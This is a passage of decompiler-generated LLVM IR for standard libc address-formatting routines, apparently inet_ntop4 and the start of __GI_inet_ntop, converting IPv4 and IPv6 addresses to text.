  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_80539ad = add i32 %v2_805399d, 4
  store i32 %v6_80539ad, i32* %edi.global-to-local, align 4
  %v2_80539ae = inttoptr i32 %v6_80539ad to i32*
  store i32 0, i32* %v2_80539ae, align 4
  %v3_80539ae = load i32, i32* %edi.global-to-local, align 4
  %v6_80539ae = add i32 %v3_80539ae, 4
  store i32 %v6_80539ae, i32* %edi.global-to-local, align 4
  %v0_80539af = load i32, i32* %eax.global-to-local, align 4
  %v2_80539af = inttoptr i32 %v6_80539ae to i32*
  store i32 %v0_80539af, i32* %v2_80539af, align 4
  %v3_80539af = load i32, i32* %edi.global-to-local, align 4
  %v6_80539af = add i32 %v3_80539af, 4
  store i32 %v6_80539af, i32* %edi.global-to-local, align 4
  %v0_80539b0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80539b0 = trunc i32 %v0_80539b0 to i16
  %v3_80539b0 = inttoptr i32 %v6_80539af to i16*
  store i16 %v1_80539b0, i16* %v3_80539b0, align 2
  %v4_80539b0 = load i32, i32* %edi.global-to-local, align 4
  %v7_80539b0 = add i32 %v4_80539b0, 2
  store i32 %v7_80539b0, i32* %edi.global-to-local, align 4
  %v0_80539b2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80539b2 = trunc i32 %v0_80539b2 to i8
  %v3_80539b2 = inttoptr i32 %v7_80539b0 to i8*
  store i8 %v1_80539b2, i8* %v3_80539b2, align 1
  %v0_8053a4226 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8053a4529 = icmp sgt i32 %v0_8053a4226, 3
  br i1 %v7_8053a4529, label %dec_label_pc_8053a4b, label %dec_label_pc_80539b8

dec_label_pc_80539b8:                             ; preds = %entry, %dec_label_pc_8053a20
  %v0_8053a4230 = phi i32 [ %v0_8053a42, %dec_label_pc_8053a20 ], [ %v0_8053a4226, %entry ]
  %v0_80539bc = load i32, i32* @ecx, align 4
  %v1_80539bc = and i32 %v0_80539bc, -256
  %v2_80539bc = or i32 %v1_80539bc, 100
  store i32 %v2_80539bc, i32* %ecx.global-to-local, align 4
  %v2_80539be = add i32 %v0_8053a4230, %v0_805398e
  store i32 %v2_80539be, i32* %eax.global-to-local, align 4
  %v0_80539c0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80539c0 = add i32 %v0_80539c0, 1
  store i32 %v1_80539c0, i32* @esi, align 4
  store i32 %v0_80539c0, i32* @edi, align 4
  %v1_80539c9 = inttoptr i32 %v2_80539be to i8*
  %v2_80539c9 = load i8, i8* %v1_80539c9, align 1
  %v3_80539c9 = zext i8 %v2_80539c9 to i32
  %v4_80539c9 = load i32, i32* @edx, align 4
  %v5_80539c9 = and i32 %v4_80539c9, -65536
  %v6_80539c9 = or i32 %v5_80539c9, %v3_80539c9
  store i32 %v6_80539c9, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_80539c9, 100
  %v6_80539cf = zext i8 %div to i32
  %v4_80539d1 = or i32 %v6_80539cf, %v1_80539bc
  store i32 %v4_80539d1, i32* %ecx.global-to-local, align 4
  %v1_80539d3 = or i32 %v4_80539d1, 48
  store i32 %v1_80539d3, i32* %eax.global-to-local, align 4
  %v1_80539d6 = trunc i32 %v1_80539d3 to i8
  %v2_80539d6 = load i32, i32* @esp, align 4
  %v4_80539d6 = add i32 %v0_80539c0, 43
  %v5_80539d6 = add i32 %v4_80539d6, %v2_80539d6
  %v6_80539d6 = inttoptr i32 %v5_80539d6 to i8*
  store i8 %v1_80539d6, i8* %v6_80539d6, align 1
  %v0_80539da = load i32, i32* %eax.global-to-local, align 4
  %v1_80539da = trunc i32 %v0_80539da to i8
  %v7_80539da = icmp eq i8 %v1_80539da, 48
  %v1_80539dc = icmp eq i1 %v7_80539da, false
  %v0_8053a02 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053a02 = and i32 %v0_8053a02, -256
  %v2_8053a02 = or i32 %v1_8053a02, 10
  store i32 %v2_8053a02, i32* %ecx.global-to-local, align 4
  %v0_8053a04 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8053a04, i32* %eax.global-to-local, align 4
  %v3_8053a06 = trunc i32 %v0_8053a04 to i16
  %v5_8053a06 = udiv i16 %v3_8053a06, 10
  br i1 %v1_80539dc, label %dec_label_pc_8053a02, label %dec_label_pc_80539de

dec_label_pc_80539de:                             ; preds = %dec_label_pc_80539b8
  %v9_80539e2 = and i32 %v0_8053a04, -65536
  %tmp = urem i16 %v5_8053a06, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div32 = udiv i16 %tmp, 10
  %v7_80539ef = zext i16 %div32 to i32
  %v11_80539ef = or i32 %v7_80539ef, %v9_80539e2
  store i32 %v11_80539ef, i32* %eax.global-to-local, align 4
  %tmp34 = urem i16 %tmp, 10
  %v12_80539ef = zext i16 %tmp34 to i32
  %v1_80539f2 = or i32 %v12_80539ef, 48
  %v8_80539f2 = trunc i32 %v1_80539f2 to i8
  store i32 %v1_80539f2, i32* %edx.global-to-local, align 4
  %v2_80539f5 = load i32, i32* @esp, align 4
  %v3_80539f5 = load i32, i32* %ebx.global-to-local, align 4
  %v4_80539f5 = add i32 %v2_80539f5, 43
  %v5_80539f5 = add i32 %v4_80539f5, %v3_80539f5
  %v6_80539f5 = inttoptr i32 %v5_80539f5 to i8*
  store i8 %v8_80539f2, i8* %v6_80539f5, align 1
  %v0_80539f9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80539f9 = trunc i32 %v0_80539f9 to i8
  %v7_80539f9 = icmp eq i8 %v1_80539f9, 48
  br i1 %v7_80539f9, label %dec_label_pc_8053a20, label %dec_label_pc_80539fe

dec_label_pc_80539fe:                             ; preds = %dec_label_pc_80539de
  %v0_80539fe = load i32, i32* @esi, align 4
  store i32 %v0_80539fe, i32* @edi, align 4
  br label %dec_label_pc_8053a20

dec_label_pc_8053a02:                             ; preds = %dec_label_pc_80539b8
  %tmp35 = urem i16 %v5_8053a06, 256
  %v3_8053a08 = and i32 %v0_8053a04, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div33 = udiv i16 %tmp35, 10
  %v7_8053a13 = zext i16 %div33 to i32
  %v11_8053a13 = or i32 %v7_8053a13, %v3_8053a08
  store i32 %v11_8053a13, i32* %eax.global-to-local, align 4
  %tmp36 = urem i16 %tmp35, 10
  %v12_8053a13 = zext i16 %tmp36 to i32
  %v1_8053a16 = or i32 %v12_8053a13, 48
  %v8_8053a16 = trunc i32 %v1_8053a16 to i8
  store i32 %v1_8053a16, i32* %edx.global-to-local, align 4
  %v0_8053a19 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053a19 = add i32 %v0_8053a19, 2
  store i32 %v1_8053a19, i32* @edi, align 4
  %v2_8053a1c = load i32, i32* @esp, align 4
  %v3_8053a1c = load i32, i32* @esi, align 4
  %v4_8053a1c = add i32 %v2_8053a1c, 43
  %v5_8053a1c = add i32 %v4_8053a1c, %v3_8053a1c
  %v6_8053a1c = inttoptr i32 %v5_8053a1c to i8*
  store i8 %v8_8053a16, i8* %v6_8053a1c, align 1
  br label %dec_label_pc_8053a20

dec_label_pc_8053a20:                             ; preds = %dec_label_pc_80539de, %dec_label_pc_80539fe, %dec_label_pc_8053a02
  store i32 %v2_80539be, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_8053a29 = load i32, i32* @edi, align 4
  %v1_8053a29 = add i32 %v0_8053a29, 2
  store i32 %v1_8053a29, i32* %ebx.global-to-local, align 4
  %v0_8053a2c = load i32, i32* %ebp.global-to-local, align 4
  %v1_8053a2c = add i32 %v0_8053a2c, 1
  store i32 %v1_8053a2c, i32* %ebp.global-to-local, align 4
  %v2_8053a2d = load i8, i8* %v1_80539c9, align 1
  %v3_8053a2d = zext i8 %v2_8053a2d to i32
  %v4_8053a2d = load i32, i32* %eax.global-to-local, align 4
  %v5_8053a2d = and i32 %v4_8053a2d, -65536
  %v6_8053a2d = or i32 %v5_8053a2d, %v3_8053a2d
  store i32 %v6_8053a2d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8053a33 = load i32, i32* @esp, align 4
  %v2_8053a33 = add i32 %v0_8053a29, 44
  %v3_8053a33 = add i32 %v2_8053a33, %v0_8053a33
  %v4_8053a33 = inttoptr i32 %v3_8053a33 to i8*
  store i8 46, i8* %v4_8053a33, align 1
  %v0_8053a38 = load i32, i32* @ecx, align 4
  %v1_8053a38 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053a38 = urem i32 %v1_8053a38, 65536
  %v3_8053a38 = load i32, i32* %edx.global-to-local, align 4
  %v4_8053a38 = mul i32 %v3_8053a38, 65536
  %v5_8053a38 = or i32 %v4_8053a38, %v2_8053a38
  %v6_8053a38 = urem i32 %v0_8053a38, 65536
  %v7_8053a38 = udiv i32 %v5_8053a38, %v6_8053a38
  %v8_8053a38 = urem i32 %v7_8053a38, 65536
  %v10_8053a38 = and i32 %v1_8053a38, -65536
  %v11_8053a38 = or i32 %v8_8053a38, %v10_8053a38
  store i32 %v11_8053a38, i32* %eax.global-to-local, align 4
  %v12_8053a38 = urem i32 %v5_8053a38, %v6_8053a38
  %v14_8053a38 = and i32 %v3_8053a38, -65536
  %v15_8053a38 = or i32 %v12_8053a38, %v14_8053a38
  %v1_8053a3b = add i32 %v15_8053a38, 48
  %v8_8053a3b = trunc i32 %v1_8053a3b to i8
  store i32 %v1_8053a3b, i32* @edx, align 4
  %v2_8053a3e = load i32, i32* @esp, align 4
  %v3_8053a3e = load i32, i32* @edi, align 4
  %v4_8053a3e = add i32 %v2_8053a3e, 43
  %v5_8053a3e = add i32 %v4_8053a3e, %v3_8053a3e
  %v6_8053a3e = inttoptr i32 %v5_8053a3e to i8*
  store i8 %v8_8053a3b, i8* %v6_8053a3e, align 1
  %v0_8053a42 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8053a45 = icmp sgt i32 %v0_8053a42, 3
  br i1 %v7_8053a45, label %dec_label_pc_8053a4b, label %dec_label_pc_80539b8

dec_label_pc_8053a4b:                             ; preds = %dec_label_pc_8053a20, %entry
  %v0_8053a4b = load i32, i32* @esp, align 4
  %v1_8053a4b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053a4b = add i32 %v0_8053a4b, 42
  %v3_8053a4b = add i32 %v2_8053a4b, %v1_8053a4b
  %v4_8053a4b = inttoptr i32 %v3_8053a4b to i8*
  store i8 0, i8* %v4_8053a4b, align 1
  %v2_8053a53 = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_8053a53, i32* %ebx.global-to-local, align 4
  %tmp23 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp23, i8** %stack_var_-92, align 4
  %v3_8053a58 = call i32 @strlen(i8* %tmp23)
  store i32 %v3_8053a58, i32* @eax, align 4
  %tmp31 = icmp ugt i32 %v3_8053a58, %v0_80539a7
  br i1 %tmp31, label %dec_label_pc_8053a66, label %dec_label_pc_8053a75

dec_label_pc_8053a66:                             ; preds = %dec_label_pc_8053a4b
  %v0_8053a66 = load i8*, i8** %stack_var_-92, align 4
  %v1_8053a66 = ptrtoint i8* %v0_8053a66 to i32
  %v2_8053a66 = call i32 @__errno_location(i32 %v1_8053a66)
  %v1_8053a6b = inttoptr i32 %v2_8053a66 to i32*
  store i32 28, i32* %v1_8053a6b, align 4
  br label %dec_label_pc_8053a84

dec_label_pc_8053a75:                             ; preds = %dec_label_pc_8053a4b
  %tmp24 = bitcast i8** %stack_var_-60 to i32*
  %v3_8053a785 = load i32, i32* %tmp24, align 4
  %tmp25 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_8053a785, i32* %tmp25, align 4
  %v0_8053a7c.cast = inttoptr i32 %v3_8053a785 to i8*
  %v4_8053a7c = call i32 @strcpy(i8* %v0_8053a7c.cast, i32 %v2_8053a53)
  br label %dec_label_pc_8053a84

dec_label_pc_8053a84:                             ; preds = %dec_label_pc_8053a66, %dec_label_pc_8053a75
  %storemerge = phi i32 [ %v4_8053a7c, %dec_label_pc_8053a75 ], [ 0, %dec_label_pc_8053a66 ]
  %v0_8053a8b = phi i32 [ %v4_8053a7c, %dec_label_pc_8053a75 ], [ 0, %dec_label_pc_8053a66 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8053986, i32* @esi, align 4
  store i32 %v0_8053985, i32* @edi, align 4
  ret i32 %v0_8053a8b

; uselistorder directives
  uselistorder i32 %v0_8053a42, { 1, 0 }
  uselistorder i32 %v3_8053a38, { 1, 0 }
  uselistorder i32 %v1_8053a38, { 1, 0 }
  uselistorder i32 %v1_8053a16, { 1, 0 }
  uselistorder i32 %v1_80539f2, { 1, 0 }
  uselistorder i32 %v0_8053a04, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80539d3, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i16 10, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8 48, { 2, 3, 12, 14, 4, 5, 6, 9, 8, 7, 10, 0, 11, 1, 13 }
  uselistorder i32 43, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i8 100, { 2, 0, 1 }
  uselistorder i32 100, { 6, 0, 4, 5, 1, 2, 3 }
  uselistorder i32 -65536, { 3, 4, 5, 1, 0, 6, 7, 10, 12, 2, 8, 9, 11 }
  uselistorder i1* @df, { 4, 28, 29, 0, 1, 30, 31, 32, 11, 2, 3, 40, 41, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder label %dec_label_pc_8053a84, { 1, 0 }
  uselistorder label %dec_label_pc_8053a20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80539b8, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_8053a8d = load i32, i32* @edi, align 4
  %v0_8053a8e = load i32, i32* @esi, align 4
  %v0_8053a8f = load i32, i32* @ebx, align 4
  %v15_8053a90 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_8053a97 = icmp eq i32 %arg1, 2
  br i1 %v9_8053a97, label %dec_label_pc_8053aa7, label %dec_label_pc_8053a9c

dec_label_pc_8053a9c:                             ; preds = %entry
  %v9_8053a9c = icmp eq i32 %arg1, 10
  %v1_8053a9f = icmp eq i1 %v9_8053a9c, false
  br i1 %v1_8053a9f, label %dec_label_pc_8053c43, label %dec_label_pc_8053abf

dec_label_pc_8053aa7:                             ; preds = %entry
  %v4_8053aa7 = ptrtoint i8* %arg3 to i32
  store i32 %v4_8053aa7, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8053ab3 = call i32 @inet_ntop4(i32 %v0_8053a8f, i32 %v0_8053a8e, i32 %v0_8053a8d)
  store i32 %v3_8053ab3, i32* %eax.global-to-local, align 4
  store i32 %v3_8053ab3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053c50

dec_label_pc_8053abf:                             ; preds = %dec_label_pc_8053a9c
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8053ac4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8053ac4, i32* %eax.global-to-local, align 4
  %tmp43 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp43, i8** %stack_var_-124, align 4
  %v6_8053ac9 = call i32 @__GI_memset(i8* %tmp43, i32 0, i32 32)
  store i32 %v6_8053ac9, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8053aeb = add i32 %arg2, 1
  br label %dec_label_pc_8053ad5

dec_label_pc_8053ad5:                             ; preds = %dec_label_pc_8053ad5.dec_label_pc_8053ad5_crit_edge, %dec_label_pc_8053abf
  %v1_8053af8 = phi i32 [ %v15_8053a90, %dec_label_pc_8053abf ], [ %v1_8053af8.pre, %dec_label_pc_8053ad5.dec_label_pc_8053ad5_crit_edge ]
  %v0_8053af372 = phi i32 [ 0, %dec_label_pc_8053abf ], [ %v0_8053afc.pre, %dec_label_pc_8053ad5.dec_label_pc_8053ad5_crit_edge ]
  %v1_8053ade = ashr i32 %v0_8053af372, 31
  %v2_8053adf = zext i32 %v0_8053af372 to i64
  %v4_8053adf = zext i32 %v1_8053ade to i64
  %v5_8053adf = mul nuw i64 %v4_8053adf, 4294967296
  %v6_8053adf = or i64 %v5_8053adf, %v2_8053adf
  %v8_8053adf = sdiv i64 %v6_8053adf, 2
  %v9_8053adf = trunc i64 %v8_8053adf to i32
  store i32 %v9_8053adf, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8053adf, i32* %ebx.global-to-local, align 4
  %v2_8053ae7 = add i32 %v0_8053af372, %arg2
  %v3_8053ae7 = inttoptr i32 %v2_8053ae7 to i8*
  %v4_8053ae7 = load i8, i8* %v3_8053ae7, align 1
  %v5_8053ae7 = zext i8 %v4_8053ae7 to i32
  store i32 %v5_8053ae7, i32* %eax.global-to-local, align 4
  %v3_8053aeb = add i32 %v2_8053aeb, %v0_8053af372
  %v4_8053aeb = inttoptr i32 %v3_8053aeb to i8*
  %v5_8053aeb = load i8, i8* %v4_8053aeb, align 1
  %v6_8053aeb = zext i8 %v5_8053aeb to i32
  store i32 %v6_8053aeb, i32* %edx.global-to-local, align 4
  %v2_8053af0 = mul nuw nsw i32 %v5_8053ae7, 256
  %v1_8053af3 = add i32 %v0_8053af372, 2
  store i32 %v1_8053af3, i32* %ecx.global-to-local, align 4
  %v2_8053af6 = or i32 %v6_8053aeb, %v2_8053af0
  store i32 %v2_8053af6, i32* %eax.global-to-local, align 4
  %v3_8053af8 = mul i32 %v9_8053adf, 4
  %v4_8053af8 = add i32 %v3_8053af8, 60
  %v5_8053af8 = add i32 %v4_8053af8, %v1_8053af8
  %v6_8053af8 = inttoptr i32 %v5_8053af8 to i32*
  store i32 %v2_8053af6, i32* %v6_8053af8, align 4
  %v0_8053afc.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8053aff = icmp sgt i32 %v0_8053afc.pre, 15
  br i1 %v7_8053aff, label %dec_label_pc_8053b01, label %dec_label_pc_8053ad5.dec_label_pc_8053ad5_crit_edge

dec_label_pc_8053ad5.dec_label_pc_8053ad5_crit_edge: ; preds = %dec_label_pc_8053ad5
  %v1_8053af8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053ad5

dec_label_pc_8053b01:                             ; preds = %dec_label_pc_8053ad5
  %v4_8053abf = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8053b0b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053b0b

dec_label_pc_8053b0b:                             ; preds = %dec_label_pc_8053b01, %dec_label_pc_8053b38
  %v0_8053b3871 = phi i32 [ 0, %dec_label_pc_8053b01 ], [ %v1_8053b38, %dec_label_pc_8053b38 ]
  %v0_8053b2370 = phi i32 [ -1, %dec_label_pc_8053b01 ], [ %v0_8053b238, %dec_label_pc_8053b38 ]
  %v0_8053b4369 = phi i32 [ -1, %dec_label_pc_8053b01 ], [ %v0_8053b289, %dec_label_pc_8053b38 ]
  %v0_8053b4e68 = phi i32 [ -1, %dec_label_pc_8053b01 ], [ %v0_8053b3313, %dec_label_pc_8053b38 ]
  %v2_8053b0b = mul nuw nsw i32 %v0_8053b3871, 4
  %v3_8053b0b = add nuw nsw i32 %v2_8053b0b, 60
  %v4_8053b0b = add i32 %v3_8053b0b, %v0_8053b0b.pre
  %v5_8053b0b = inttoptr i32 %v4_8053b0b to i32*
  %v6_8053b0b = load i32, i32* %v5_8053b0b, align 4
  %v7_8053b0b = icmp eq i32 %v6_8053b0b, 0
  %v1_8053b10 = icmp eq i1 %v7_8053b0b, false
  %v10_8053b23 = icmp eq i32 %v0_8053b2370, -1
  br i1 %v1_8053b10, label %dec_label_pc_8053b23, label %dec_label_pc_8053b12

dec_label_pc_8053b12:                             ; preds = %dec_label_pc_8053b0b
  %v1_8053b15 = icmp eq i1 %v10_8053b23, false
  br i1 %v1_8053b15, label %dec_label_pc_8053b20, label %dec_label_pc_8053b17

dec_label_pc_8053b17:                             ; preds = %dec_label_pc_8053b12
  store i32 %v0_8053b3871, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053b38

dec_label_pc_8053b20:                             ; preds = %dec_label_pc_8053b12
  %v0_8053b20 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053b20 = add i32 %v0_8053b20, 1
  store i32 %v1_8053b20, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053b38

dec_label_pc_8053b23:                             ; preds = %dec_label_pc_8053b0b
  br i1 %v10_8053b23, label %dec_label_pc_8053b38, label %dec_label_pc_8053b28

dec_label_pc_8053b28:                             ; preds = %dec_label_pc_8053b23
  %v10_8053b28 = icmp eq i32 %v0_8053b4369, -1
  %v0_8053b31.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053b2d = load i32, i32* @ebp, align 4
  %v7_8053b2f = icmp sgt i32 %v0_8053b31.pre, %v1_8053b2d
  %or.cond = or i1 %v10_8053b28, %v7_8053b2f
  br i1 %or.cond, label %dec_label_pc_8053b31, label %dec_label_pc_8053b35

dec_label_pc_8053b31:                             ; preds = %dec_label_pc_8053b28
  store i32 %v0_8053b31.pre, i32* @ebp, align 4
  store i32 %v0_8053b4e68, i32* @edi, align 4
  br label %dec_label_pc_8053b35

dec_label_pc_8053b35:                             ; preds = %dec_label_pc_8053b28, %dec_label_pc_8053b31
  %v0_8053b2811 = phi i32 [ %v0_8053b4e68, %dec_label_pc_8053b31 ], [ %v0_8053b4369, %dec_label_pc_8053b28 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b38

dec_label_pc_8053b38:                             ; preds = %dec_label_pc_8053b23, %dec_label_pc_8053b20, %dec_label_pc_8053b17, %dec_label_pc_8053b35
  %v0_8053b3313 = phi i32 [ %v0_8053b4e68, %dec_label_pc_8053b23 ], [ %v0_8053b4e68, %dec_label_pc_8053b20 ], [ %v0_8053b3871, %dec_label_pc_8053b17 ], [ -1, %dec_label_pc_8053b35 ]
  %v0_8053b238 = phi i32 [ -1, %dec_label_pc_8053b23 ], [ %v0_8053b2370, %dec_label_pc_8053b20 ], [ %v0_8053b3871, %dec_label_pc_8053b17 ], [ -1, %dec_label_pc_8053b35 ]
  %v0_8053b289 = phi i32 [ %v0_8053b4369, %dec_label_pc_8053b23 ], [ %v0_8053b4369, %dec_label_pc_8053b20 ], [ %v0_8053b4369, %dec_label_pc_8053b17 ], [ %v0_8053b2811, %dec_label_pc_8053b35 ]
  %v1_8053b38 = add nuw nsw i32 %v0_8053b3871, 1
  store i32 %v1_8053b38, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8053b38, 8
  br i1 %exitcond, label %dec_label_pc_8053b3e, label %dec_label_pc_8053b0b

dec_label_pc_8053b3e:                             ; preds = %dec_label_pc_8053b38
  %v10_8053b3e = icmp eq i32 %v0_8053b3313, -1
  br i1 %v10_8053b3e, label %dec_label_pc_8053b50, label %dec_label_pc_8053b43

dec_label_pc_8053b43:                             ; preds = %dec_label_pc_8053b3e
  %v10_8053b43 = icmp eq i32 %v0_8053b289, -1
  %v0_8053b4c.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8053b43, label %dec_label_pc_8053b4c, label %dec_label_pc_8053b48

dec_label_pc_8053b48:                             ; preds = %dec_label_pc_8053b43
  %v1_8053b48 = load i32, i32* @ebp, align 4
  %v7_8053b4a = icmp sgt i32 %v0_8053b4c.pre, %v1_8053b48
  br i1 %v7_8053b4a, label %dec_label_pc_8053b4c, label %dec_label_pc_8053b50.thread

dec_label_pc_8053b50.thread:                      ; preds = %dec_label_pc_8053b48
  br label %dec_label_pc_8053b55

dec_label_pc_8053b4c:                             ; preds = %dec_label_pc_8053b43, %dec_label_pc_8053b48
  store i32 %v0_8053b4c.pre, i32* @ebp, align 4
  store i32 %v0_8053b3313, i32* @edi, align 4
  br label %dec_label_pc_8053b50

dec_label_pc_8053b50:                             ; preds = %dec_label_pc_8053b3e, %dec_label_pc_8053b4c
  %v0_8053b50 = phi i32 [ %v0_8053b289, %dec_label_pc_8053b3e ], [ %v0_8053b3313, %dec_label_pc_8053b4c ]
  %v10_8053b50 = icmp eq i32 %v0_8053b50, -1
  br i1 %v10_8053b50, label %dec_label_pc_8053b5d, label %dec_label_pc_8053b50.dec_label_pc_8053b55_crit_edge

dec_label_pc_8053b50.dec_label_pc_8053b55_crit_edge: ; preds = %dec_label_pc_8053b50
  %v0_8053b55.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8053b55

dec_label_pc_8053b55:                             ; preds = %dec_label_pc_8053b50.dec_label_pc_8053b55_crit_edge, %dec_label_pc_8053b50.thread
  %v0_8053b55 = phi i32 [ %v1_8053b48, %dec_label_pc_8053b50.thread ], [ %v0_8053b55.pre, %dec_label_pc_8053b50.dec_label_pc_8053b55_crit_edge ]
  %v0_8053b5049 = phi i32 [ %v0_8053b289, %dec_label_pc_8053b50.thread ], [ %v0_8053b50, %dec_label_pc_8053b50.dec_label_pc_8053b55_crit_edge ]
  %v1_8053b55 = add i32 %v0_8053b55, -1
  %v6_8053b55 = sub i32 0, %v0_8053b55
  %v7_8053b55 = and i32 %v0_8053b55, %v6_8053b55
  %v8_8053b55 = icmp slt i32 %v7_8053b55, 0
  %v9_8053b55 = icmp eq i32 %v1_8053b55, 0
  %v10_8053b55 = icmp slt i32 %v1_8053b55, 0
  %v3_8053b58 = icmp eq i1 %v10_8053b55, %v8_8053b55
  %v4_8053b58 = icmp eq i1 %v9_8053b55, false
  %v5_8053b58 = and i1 %v4_8053b58, %v3_8053b58
  br i1 %v5_8053b58, label %dec_label_pc_8053b5d, label %dec_label_pc_8053b5a

dec_label_pc_8053b5a:                             ; preds = %dec_label_pc_8053b55
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8053b5d

dec_label_pc_8053b5d:                             ; preds = %dec_label_pc_8053b55, %dec_label_pc_8053b50, %dec_label_pc_8053b5a
  %v0_8053bfd18 = phi i32 [ %v0_8053b5049, %dec_label_pc_8053b55 ], [ -1, %dec_label_pc_8053b50 ], [ -1, %dec_label_pc_8053b5a ]
  %v2_8053b5d = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8053b5d, i32* @ebx, align 4
  %v3_8053bdf = add i32 %v4_8053abf, 64
  %v12_8053b9d = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_8053bfd61 = icmp eq i32 %v0_8053bfd18, -1
  %v1_8053ba5 = icmp eq i1 %v12_8053b9d, false
  br label %dec_label_pc_8053b68

dec_label_pc_8053b68:                             ; preds = %dec_label_pc_8053b5d, %dec_label_pc_8053bf3
  %v10_8053bfd67 = phi i1 [ %v10_8053bfd61, %dec_label_pc_8053b5d ], [ %v10_8053bfd, %dec_label_pc_8053bf3 ]
  %v0_8053b8266 = phi i32 [ 0, %dec_label_pc_8053b5d ], [ %v1_8053bf3, %dec_label_pc_8053bf3 ]
  %v1_8053b7865 = phi i32 [ %v0_8053bfd18, %dec_label_pc_8053b5d ], [ %v0_8053bfd.pre, %dec_label_pc_8053bf3 ]
  %v0_8053b8664 = phi i32 [ %v2_8053b5d, %dec_label_pc_8053b5d ], [ %v0_8053b7c19, %dec_label_pc_8053bf3 ]
  %stack_var_-120.163 = phi i8* [ null, %dec_label_pc_8053b5d ], [ %stack_var_-120.0, %dec_label_pc_8053bf3 ]
  %stack_var_-116.162 = phi i32 [ 32, %dec_label_pc_8053b5d ], [ %stack_var_-116.0, %dec_label_pc_8053bf3 ]
  br i1 %v10_8053bfd67, label %dec_label_pc_8053b82, label %dec_label_pc_8053b6d

dec_label_pc_8053b6d:                             ; preds = %dec_label_pc_8053b68
  %v12_8053b6d = icmp eq i32 %v0_8053b8266, %v1_8053b7865
  %v5_8053b6f = icmp slt i32 %v0_8053b8266, %v1_8053b7865
  br i1 %v5_8053b6f, label %dec_label_pc_8053b82, label %dec_label_pc_8053b71

dec_label_pc_8053b71:                             ; preds = %dec_label_pc_8053b6d
  %v1_8053b71 = load i32, i32* @ebp, align 4
  %v2_8053b71 = add i32 %v1_8053b71, %v1_8053b7865
  store i32 %v2_8053b71, i32* %eax.global-to-local, align 4
  %v5_8053b76 = icmp slt i32 %v0_8053b8266, %v2_8053b71
